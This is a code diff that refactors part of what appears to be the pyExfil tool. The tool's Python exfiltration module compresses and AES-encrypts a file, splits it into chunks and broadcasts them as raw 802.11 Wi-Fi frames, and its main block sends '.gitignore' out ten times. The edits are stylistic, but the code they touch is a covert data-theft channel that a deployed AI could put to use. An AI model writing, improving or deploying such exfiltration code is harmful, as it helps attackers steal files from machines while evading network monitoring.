@@ -11,11 +11,12 @@ BSSID_NAME  = "pyExfil"
 MAX_SIZE    = 65000
 ADAPTER     = "en0"
 DELIMITER   = "\x00\xFF\x00\xFF" # Using this delimiter since after compression and encryption
-                                 # chars should not be repeating like this.
 ADDR1       = "00:00:00:00:00:42"
 ADDR2       = "00:00:00:00:00:42"
 ADDR3       = "00:00:00:00:00:42"
 TIMEOUT     = 0.1
+
+
 
 
 class Dot11EltRates(Packet):
@@ -24,8 +25,10 @@ class Dot11EltRates(Packet):
     # Our Test STA supports the rates 6, 9, 12, 18, 24, 36, 48 and 54 Mbps
     supported_rates = [0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c]
     fields_desc = [ByteField("ID", 1), ByteField("len", len(supported_rates))]
-    for index, rate in enumerate(supported_rates):
-        fields_desc.append(ByteField("supported_rate{0}".format(index + 1), rate))
+    fields_desc.extend(
+        ByteField("supported_rate{0}".format(index + 1), rate)
+        for index, rate in enumerate(supported_rates)
+    )
 
 class AESCipher(object):
 
@@ -50,7 +53,7 @@ class AESCipher(object):
 
     @staticmethod
     def _unpad(s):
-        return s[:-ord(s[len(s)-1:])]
+        return s[:-ord(s[-1:])]
 
 def _splitString(stri, length):
     """
@@ -126,17 +129,13 @@ def exfiltrate(file_name, key="shut_the_fuck_up_donnie!"):
                                     DELIMITER,
                                     "\x00\x00\x00"
                                     ) # Making this a split by 3 so easy to know
-                                    # if this is an init or data
-
-    i = 1
     time.sleep(TIMEOUT)
-    for chunk in chunksies:
-        _sendPacket("%s%s%s" % (i, DELIMITER, chunk))
+    for i, chunk in enumerate(chunksies, start=1):
+        _sendPacket(f"{i}{DELIMITER}{chunk}")
         sys.stdout.write(".")
         time.sleep(TIMEOUT)
-        i += 1
     sys.stdout.write("\nSent out %s packets.\n" % len(chunksies))
 
 if __name__ == "__main__":
-    for i in range(0,10):
+    for _ in range(0,10):
         exfiltrate(file_name=".gitignore")
